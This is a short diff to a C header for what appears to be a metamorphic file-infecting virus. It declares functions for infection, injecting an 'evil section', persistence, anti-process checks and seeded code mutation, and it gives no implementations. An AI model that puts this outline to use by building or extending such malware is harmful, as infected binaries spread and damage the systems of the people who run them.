@@ -39,14 +39,6 @@ typedef enum {
 	FT_TEXT
 } file_type_t;
 
-typedef struct s_meta
-{
-	uint64_t	fingerprint;
-	uint64_t	counter;
-	uint32_t	version;
-	uint32_t	flags;
-}	t_meta;
-
 
 typedef struct {
 	file_type_t         type;
@@ -55,16 +47,17 @@ typedef struct {
 	size_t              length;
 } magic_rule_t;
 
-void        death(void);
-void        scan_dir(char *path);
-file_type_t detect_file(const char *path);
-int         ready_infect(char *path);
-void        inject(char *path);
-int         anti_process(char *path);
-void        persistence();
-off_t		vaddr_to_file_offset(int fd, uint64_t vaddr);
-off_t		find_signature_offset(int fd);
-void metamorphe(size_t stub_size,unsigned char *stub[]);
-int add_evil_section(const char *path, const unsigned char *stub, size_t stub_len);
+void        	death(void);
+unsigned char	get_seed(char *path);
+void        	scan_dir(char *path);
+file_type_t 	detect_file(const char *path);
+int         	ready_infect(char *path);
+void        	inject(char *path);
+int         	anti_process(char *path);
+void        	persistence();
+off_t			vaddr_to_file_offset(int fd, uint64_t vaddr);
+off_t			find_signature_offset(int fd);
+void			metamorphe(size_t stub_size,unsigned char *stub, unsigned char seed);
+int				add_evil_section(char *path,unsigned char *stub, size_t stub_len);
 
 #endif
